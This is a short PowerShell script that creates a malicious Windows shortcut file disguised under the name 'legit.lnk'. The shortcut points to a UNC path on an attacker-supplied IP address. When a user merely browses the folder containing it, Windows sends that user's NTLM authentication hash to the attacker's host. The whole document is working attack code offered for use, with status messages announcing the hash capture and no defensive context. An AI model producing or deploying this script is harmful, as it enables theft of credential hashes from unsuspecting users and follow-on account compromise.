# Creates a malicious LNK file that triggers NTLM authentication when browsed

param(
    [Parameter(Mandatory=$true)]
    [string]$AttackerIP,
    
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "C:\legit.lnk"
)

try {
    Write-Host "[*] Creating malicious LNK file..." -ForegroundColor Yellow
    
    $objShell = New-Object -ComObject WScript.Shell
    $lnk = $objShell.CreateShortcut($OutputPath)
    $lnk.TargetPath = "\\$AttackerIP\@pwn.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
    $lnk.HotKey = "Ctrl+Alt+O"
    $lnk.Save()
    
    Write-Host "[+] Malicious LNK created successfully at: $OutputPath" -ForegroundColor Green
    Write-Host "[*] When a user browses to this directory, NTLM hash will be sent to $AttackerIP" -ForegroundColor Cyan
}
catch {
    Write-Host "[-] Error creating LNK file: $_" -ForegroundColor Red
}